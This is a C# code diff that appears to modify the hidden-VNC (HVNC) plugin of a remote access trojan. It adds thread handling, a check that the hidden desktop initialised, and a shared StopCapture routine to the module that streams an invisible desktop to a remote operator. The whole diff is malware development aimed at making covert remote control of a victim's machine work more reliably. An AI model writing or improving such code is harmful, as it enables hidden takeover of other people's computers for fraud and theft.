@@ -30,8 +30,21 @@ namespace Plugin
                         {
                             case "capture":
                                 {
-                                    HiddenDesktopHandler.InitializeDesktop();
-                                    CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger));
+                                    if (IsOk)
+                                        return;
+
+                                    IsOk = true;
+
+                                    if (!HiddenDesktopHandler.InitializeDesktop())
+                                    {
+                                        StopCapture();
+                                        return;
+                                    }
+
+                                    new Thread(() =>
+                                    {
+                                        CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger));
+                                    }).Start();
                                     break;
                                 }
 
@@ -69,8 +82,7 @@ namespace Plugin
 
                             case "stop":
                                 {
-                                    IsOk = false;
-                                    HiddenDesktopHandler.DisposeDesktop();
+                                    StopCapture();
                                     break;
                                 }
 
@@ -100,9 +112,12 @@ namespace Plugin
             MemoryStream stream;
             Thread.Sleep(1);
 
-            // Make sure the desktop is initialized and the thread is attached
-            // The call inside Screenshot() ensures this, but it's good practice to ensure the thread desktop is set.
-            HiddenDesktopHandler.InitializeDesktop();
+            if (!HiddenDesktopHandler.InitializeDesktop())
+            {
+                Debug.WriteLine("HVNC: failed to initialize hidden desktop");
+                Connection.Disconnected();
+                return;
+            }
 
             while (IsOk && Connection.IsConnected)
             {
@@ -208,13 +223,18 @@ namespace Plugin
             }
             try
             {
-                IsOk = false;
+                StopCapture();
                 bmp?.UnlockBits(bmpData);
                 bmp?.Dispose();
-                HiddenDesktopHandler.DisposeDesktop(); // Clean up the desktop after the thread finishes
                 GC.Collect();
             }
             catch { }
+        }
+
+        public static void StopCapture()
+        {
+            IsOk = false;
+            HiddenDesktopHandler.DisposeDesktop();
         }
 
         [DllImport("user32.dll")]
